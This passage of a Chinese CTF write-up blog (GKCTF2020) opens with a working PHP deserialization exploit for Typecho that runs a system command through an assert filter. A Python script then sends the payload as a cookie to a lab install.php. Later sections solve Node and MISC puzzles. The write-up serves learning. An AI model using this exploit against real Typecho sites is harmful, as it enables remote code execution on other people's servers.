+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$CMD = <span class="string">'system("cat /flag")'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> RSS2 = <span class="string">'RSS 2.0'</span>;</span><br><span class="line">    <span class="keyword">const</span> ATOM1 = <span class="string">'ATOM 1.0'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $_type;</span><br><span class="line">    <span class="keyword">private</span> $_items;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//$this-&gt;_type = $this::RSS2;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_type = <span class="keyword">$this</span>::ATOM1;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_items[<span class="number">0</span>] = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'category'</span> =&gt; <span class="keyword">array</span>(<span class="keyword">new</span> Typecho_Request()),</span><br><span class="line">            <span class="string">'author'</span> =&gt; <span class="keyword">new</span> Typecho_Request(),</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_params = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">private</span> $_filter = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_params[<span class="string">'screenName'</span>] = $GLOBALS[CMD];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_filter[<span class="number">0</span>] = <span class="string">'assert'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$exp = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'adapter'</span> =&gt; <span class="keyword">new</span> Typecho_Feed(),</span><br><span class="line">    <span class="string">'prefix'</span>  =&gt; <span class="string">'typecho_'</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($exp));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>exp.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">'http://97caa567-ba9d-4f95-825b-14bebe796a6e.node3.buuoj.cn/install.php?finish=1'</span></span><br><span class="line">files=&#123;<span class="string">'file'</span>:<span class="number">123</span>&#125;</span><br><span class="line">headers=&#123;<span class="string">'cookie'</span>:<span class="string">'PHPSESSID=test;__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6Mjp7czo4OiJjYXRlZ29yeSI7YToxOntpOjA7TzoxNToiVHlwZWNob19SZXF1ZXN0IjoyOntzOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9wYXJhbXMiO2E6MTp7czoxMDoic2NyZWVuTmFtZSI7czoxOToic3lzdGVtKCJjYXQgL2ZsYWciKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fXM6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjE5OiJzeXN0ZW0oImNhdCAvZmxhZyIpIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6ImFzc2VydCI7fX19fX1zOjY6InByZWZpeCI7czo4OiJ0eXBlY2hvXyI7fQ=='</span>,</span><br><span class="line"> <span class="string">'Referer'</span>:<span class="string">'http://97caa567-ba9d-4f95-825b-14bebe796a6e.node3.buuoj.cn/install.php'</span>&#125;</span><br><span class="line">re=requests.post(url,files=files,headers=headers,data=&#123;<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span>: <span class="string">"123456789"</span>&#125;)</span><br><span class="line">print(re.text)</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-EZ三剑客-EzNode"><a href="#6-EZ三剑客-EzNode" class="headerlink" title="6.EZ三剑客-EzNode"></a>6.EZ三剑客-EzNode</h3><p>首先看源码，发现delay被设置的很大，执行命令会超时，在node.js<a href="http://nodejs.cn/api/timers.html#timers_settimeout_callback_delay_args" target="_blank" rel="noopener">文档中</a>指出 <code>当</code>delay<code>大于</code>2147483647<code>或小于</code>1<code>时，则</code>delay<code>将会被设置为</code>1<code>。 非整数的 delay 会被截断为整数</code></p>
+<p>然后题目很奇怪给了包的版本信息，感觉应该是 有公开漏洞</p>
+<p>在<a href="https://github.com/advisories" target="_blank" rel="noopener">github advisories</a>找到了漏洞信息</p>
+<p><img src="/2020/05/GKCTF2020-Writeup/image-20200525151514661.png" alt="image-20200525151514661"></p>
+<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="1-Pokemon"><a href="#1-Pokemon" class="headerlink" title="1. Pokémon"></a>1. Pokémon</h3><p>GBA游戏，直接去103号道路，道路上就是flag</p>
+<h3 id="2-Harley-Quinn"><a href="#2-Harley-Quinn" class="headerlink" title="2.Harley Quinn"></a>2.Harley Quinn</h3><p>题目信息隐藏的挺细致的，导致一直懵逼。</p>
+<p>先是压缩包的属性里有解密的信息</p>
+<p><img src="/2020/05/GKCTF2020-Writeup/image-20200526105114519.png" alt="image-20200526105114519"></p>
+<p>然后根据题目描述下载Free_File_Camouflage V1.25</p>
+<p>解压后，有个wav音频文件，属性里也有信息</p>
+<p><img src="/2020/05/GKCTF2020-Writeup/image-20200526105632498.png" alt="image-20200526105632498"></p>
+<p>提示密码有21位</p>
+<p>音频用Sonic Visualiser打开后发现末尾有播音号 可以自己手动解，或者用</p>
+<p><img src="/2020/05/GKCTF2020-Writeup/image-20200526105730727.png" alt="image-20200526105730727"></p>
+<p><img src="/2020/05/GKCTF2020-Writeup/image-20200526113701783.png" alt="image-20200526113701783"></p>
+<p>接着用九宫格密码解</p>
+<p>222按3下2键就是c，后面同理</p>
+<p><img src="/2020/05/GKCTF2020-Writeup/clip_image001.png" alt="img"></p>
+<p>最后解出 <code>ctfisfun</code></p>
+<p>然后用然后用软件</p>
+<p><img src="/2020/05/GKCTF2020-Writeup/image-20200526155704949.png" alt="image-20200526155704949"></p>
+<h3 id="3-code-obfuscation"><a href="#3-code-obfuscation" class="headerlink" title="3.code obfuscation"></a>3.code obfuscation</h3><p>附件是个扭曲的二维码</p>
+<p><img src="/2020/05/GKCTF2020-Writeup/image-20200526161615952.png" alt="image-20200526161615952"></p>
+<p>然后binwalke可以分解出个要密码压缩包</p>
+<p>接着修图，ps打开图片,选定好需要变换的区域，右键自由变换后再扭曲，然后截取下来</p>
+<p><img src="/2020/05/GKCTF2020-Writeup/image-20200526161626648.png" alt="image-20200526161626648"></p>
+<p>接着matlab处理</p>
+<p><img src="/2020/05/GKCTF2020-Writeup/image-20200526161717329.png" alt="image-20200526161717329"></p>
+<p>扫出来 <code>base(gkctf)</code></p>
+<p>试了下解不了，可能要baseXX编码。然后用base58解出来了</p>
+<p><img src="/2020/05/GKCTF2020-Writeup/image-20200526163147548.png" alt="image-20200526163147548"></p>
+<p>解压后得到两个文件一个是js代码，一个是密文</p>
+<p>js代码经过 混淆，利用<a href="http://tool.chinaz.com/js.aspx" target="_blank" rel="noopener">在线工具</a>解密后得到解密后的js代码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> a b c d e f g h i j k l m n o p q r s t u v w x y z <span class="keyword">do</span> <span class="built_in">eval</span> An = <span class="string">"n"</span></span><br><span class="line">    done</span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> A B C D E F G H I J K L M N O P Q R S T U V W X Y Z <span class="keyword">do</span> <span class="built_in">eval</span> An = <span class="string">"n"</span></span><br><span class="line">    done</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> a b c d e f g h i j <span class="keyword">do</span> <span class="built_in">eval</span> Bn = <span class="string">"n"</span></span><br><span class="line">    num =</span><br><span class="line">    $((num + <span class="number">1</span>)) done alert(<span class="string">"Bk=' ';Bm='"</span></span><br><span class="line">        ';Bn='#</span><br><span class="line">        <span class="string">';Bs='</span> (<span class="string">';Bt='</span>)</span><br><span class="line">        <span class="string">';By='</span>.</span><br><span class="line">        <span class="string">';Cb='</span>;</span><br><span class="line">        <span class="string">';Cc='</span> &lt; <span class="string">';Ce='</span> &gt; <span class="string">';Cl='</span></span><br><span class="line">        _ <span class="string">';Cn='</span> &#123;</span><br><span class="line">            <span class="string">';Cp='</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="string">';Da='</span></span><br><span class="line">        <span class="number">0</span> <span class="string">';Db='</span></span><br><span class="line">        <span class="number">1</span> <span class="string">';Dc='</span></span><br><span class="line">        <span class="number">2</span> <span class="string">';Dd='</span></span><br><span class="line">        <span class="number">3</span> <span class="string">';De='</span></span><br><span class="line">        <span class="number">4</span> <span class="string">';Df='</span></span><br><span class="line">        <span class="number">5</span> <span class="string">';Dg='</span></span><br><span class="line">        <span class="number">6</span> <span class="string">';Dh='</span></span><br><span class="line">        <span class="number">7</span> <span class="string">';Di='</span></span><br><span class="line">        <span class="number">8</span> <span class="string">';Dj='</span></span><br><span class="line">        <span class="number">9</span> <span class="string">';")</span></span><br></pre></td></tr></table></figure>
+
+<p>解密脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">b = <span class="string">"Bn$Ai$An$Ac$Al$Au$Ad$Ae$Bk$Cc$As$At$Ad$Ai$Ao$By$Ah$Ce$Ai$An$At$Bk$Am$Aa$Ai$An$Bs$Bt$Cn$Ap$Ar$Ai$An$At$Bs$Bm$Aw$Dd$Al$Ac$Da$Am$Ae$Cl$De$Ao$Cl$Dj$Ak$Ac$At$Df$Bm$Bt$Cb$Ar$Ae$At$Au$Ar$An$Bk$Da$Cb$Cp"</span></span><br><span class="line"></span><br><span class="line">c = &#123;<span class="string">"Bk"</span>: <span class="string">' '</span>, <span class="string">"Bm"</span>: <span class="string">'"'</span>, <span class="string">"Bn"</span>: <span class="string">'#'</span>, <span class="string">"Bs"</span>: <span class="string">'('</span>, <span class="string">"Bt"</span>: <span class="string">')'</span>, <span class="string">"By"</span>: <span class="string">'.'</span>, <span class="string">"Cb"</span>: <span class="string">','</span>, <span class="string">"Cc"</span>: <span class="string">'&lt;'</span>, <span class="string">"Ce"</span>: <span class="string">'&gt;'</span>, <span class="string">"Cl"</span>: <span class="string">'_'</span>,</span><br><span class="line">     <span class="string">"Cn"</span>: <span class="string">'&#123;'</span>, <span class="string">"Cp"</span>: <span class="string">'&#125;'</span>, <span class="string">"Da"</span>: <span class="string">'0'</span>, <span class="string">"Db"</span>: <span class="string">'1'</span>, <span class="string">"Dc"</span>: <span class="string">'2'</span>, <span class="string">"Dd"</span>: <span class="string">'3'</span>, <span class="string">"De"</span>: <span class="string">'4'</span>, <span class="string">"Df"</span>: <span class="string">'5'</span>, <span class="string">"Dg"</span>: <span class="string">'6'</span>, <span class="string">"Dh"</span>: <span class="string">'7'</span>,</span><br><span class="line">     <span class="string">"Di"</span>: <span class="string">'8'</span>, <span class="string">"Dj"</span>: <span class="string">'9'</span>&#125;</span><br><span class="line">f = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b.split(<span class="string">'$'</span>):</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">in</span> c.keys():</span><br><span class="line">        f = f + c[i]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        f = f + i[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">print(f)</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-Sail-a-boat-down-the-river"><a href="#4-Sail-a-boat-down-the-river" class="headerlink" title="4.Sail a boat down the river"></a>4.Sail a boat down the river</h3><p>直接用命令分解视频</p>
+<p><img src="/2020/05/GKCTF2020-Writeup/image-20200526165220148.png" alt="image-20200526165220148"></p>
+<p>然后从118帧开始观察亮点，短是1帧，长是3帧</p>
+<p><img src="/2020/05/GKCTF2020-Writeup/image-20200526165724934.png" alt="image-20200526165724934"></p>
+<figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">-</span><span class="string">.</span>--<span class="comment">/</span><span class="string">.</span>--<span class="comment">/</span>--<span class="literal">-</span><span class="string">.</span><span class="string">.</span><span class="comment">/</span>--<span class="string">.</span><span class="comment">/</span></span><br></pre></td></tr></table></figure>
+
+<p>摩斯解码</p>
+<p><img src="/2020/05/GKCTF2020-Writeup/image-20200526170554507.png" alt="image-20200526170554507"></p>
+<p>第465帧有个二维码，扫码是个百度盘链接</p>
+<p>打开，提取码YW8G</p>
+<p><img src="/2020/05/GKCTF2020-Writeup/image-20200526170728445.png" alt="image-20200526170728445"></p>
+<p>然后玩数独，根据提示得到密钥</p>
+<p><code>52693795149137</code></p>
+<p>加密是AES(hex)，坑点是字符集 <code>gb18030/ISO10126</code></p>
+<p><img src="/2020/05/GKCTF2020-Writeup/image-20200526172054944.png" alt="image-20200526172054944"></p>
+<p>解开压缩包，得到 <code>逆光vocal.ovex</code>用打谱软件打开就有flag。真心想不到</p>
+
+    </div>
+
+    
+    
+    
+      
+  <div class="popular-posts-header">相关文章</div>
+  <ul class="popular-posts">
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2020/03/51ELAB易霖博YCTF-Writeup/" rel="bookmark">51ELAB易霖博YCTF</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2020/05/De1CTF2020-复现/" rel="bookmark">De1CTF2020-复现</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2020/07/DASCTF-7月赛/" rel="bookmark">DASCTF_7月赛</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2020/03/2020北邮校赛/" rel="bookmark">2020北邮校赛</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2020/05/NPUCTF2020-复现/" rel="bookmark">NPUCTF-复现</a></div>
+      
+    </li>
+  
+  </ul>
+
+        
+      
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>0xCreed</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://0xcreed.jxustctf.top/2020/05/GKCTF2020-Writeup/" title="GKCTF2020-WP">https://0xcreed.jxustctf.top/2020/05/GKCTF2020-Writeup/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+</div>
+
+      
+		<div>
+		
+			
+				<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+			
+			
+      <footer class="post-footer">
+          
+            
+          
+          <div class="post-tags">
+            
+              <a href="/tags/CTF/" rel="tag"> <i class="fa fa-tag"></i> CTF</a>
+			   
+            
+              <a href="/tags/WP/" rel="tag"> <i class="fa fa-tag"></i> WP</a>
+			   
+            
+          </div>
+        
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2020/05/De1CTF2020-复现/" rel="next" title="De1CTF2020-复现">
+                  <i class="fa fa-chevron-left"></i> De1CTF2020-复现
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/2020/05/NPUCTF2020-复现/" rel="prev" title="NPUCTF-复现">
+                  NPUCTF-复现 <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="comments"></div>
+  
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+	
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+	
+	  </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB"><span class="nav-number">1.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Check-IN"><span class="nav-number">1.1.</span> <span class="nav-text">1.Check IN</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-老八小超市儿"><span class="nav-number">1.2.</span> <span class="nav-text">2.老八小超市儿</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-CVE版签到"><span class="nav-number">1.3.</span> <span class="nav-text">3.CVE版签到</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-EZ三剑客-EzWeb"><span class="nav-number">1.4.</span> <span class="nav-text">4.EZ三剑客-EzWeb</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-EZ三剑客-EzTypecho"><span class="nav-number">1.5.</span> <span class="nav-text">5.EZ三剑客-EzTypecho</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-EZ三剑客-EzNode"><span class="nav-number">1.6.</span> <span class="nav-text">6.EZ三剑客-EzNode</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MISC"><span class="nav-number">2.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Pokemon"><span class="nav-number">2.1.</span> <span class="nav-text">1. Pokémon</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Harley-Quinn"><span class="nav-number">2.2.</span> <span class="nav-text">2.Harley Quinn</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-code-obfuscation"><span class="nav-number">2.3.</span> <span class="nav-text">3.code obfuscation</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-Sail-a-boat-down-the-river"><span class="nav-number">2.4.</span> <span class="nav-text">4.Sail a boat down the river</span></a></li></ol></li></ol></div>
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/1.gif"
+      alt="0xCreed">
+  <p class="site-author-name" itemprop="name">0xCreed</p>
+  <div class="site-description" itemprop="description">Winter is coming</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">31</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        <span class="site-state-item-count">35</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+</div>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/0xCreed" title="GitHub &rarr; https://github.com/0xCreed" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      推荐阅读
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/mwq1024/" title="https://www.cnblogs.com/mwq1024/" rel="noopener" target="_blank">旧博客</a>
+        </li>
+      
+        <li class="links-of-blogroll-item">
+          <a href="https://www.leavesongs.com/" title="https://www.leavesongs.com/" rel="noopener" target="_blank">离别歌</a>
+        </li>
+      
+        <li class="links-of-blogroll-item">
+          <a href="https://li1m.github.io/" title="https://li1m.github.io/" rel="noopener" target="_blank">LiM</a>
+        </li>
+      
+    </ul>
+  </div>
+
+      </div>
+	  
+	  
+	
+
+    </div>
+  </aside>
+
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+      <style>
+    #aplayer {
+        width: 50%;
+        margin: 0 auto;
+    }
+    @media screen and (max-device-width: 400px) {
+        #aplayer {
+            width: 100%;
+        }
+    }
+      </style>
+      <link rel="stylesheet" href="/dist/APlayer.min.css">
+      <div id="aplayer"></div>
+      <script type="text/javascript" src="/dist/APlayer.min.js"></script>
+      <script type="text/javascript" src="/dist/music.js"></script>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2019 – <span itemprop="copyrightYear">2022</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">0xCreed</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    
+    <span title="站点总字数">242k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    
+    <span title="站点阅读时长">3:40</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.9.0</div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.4.0</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='120' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
+<script src="/js/schemes/pisces.js?v=7.4.0"></script>
+<script src="/js/next-boot.js?v=7.4.0"></script>
+
+
+
+  
+  <script>
+    (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      bp.src = (curProtocol === 'https') ? 'https://zz.bdstatic.com/linksubmit/push.js' : 'http://push.zhanzhang.baidu.com/push.js';
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.4.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+
+<script>
+NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+  var GUEST = ['nick', 'mail', 'link'];
+  var guest = 'nick,mail,link';
+  guest = guest.split(',').filter(item => {
+    return GUEST.includes(item);
+  });
+  new Valine({
+    el: '#comments',
+    verify: false,
+    notify: false,
+    appId: '0eYM2A8pUSnA2EEyrujClGRN-MdYXbMMI',
+    appKey: 'BJmUYA3jJHocnfnm4LpPR9Ow',
+    placeholder: 'Just go go',
+    avatar: 'mm',
+    meta: guest,
+    pageSize: '10' || 10,
+    visitor: false,
+    lang: '' || 'zh-cn',
+    path: location.pathname
+  });
+}, window.Valine);
+</script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
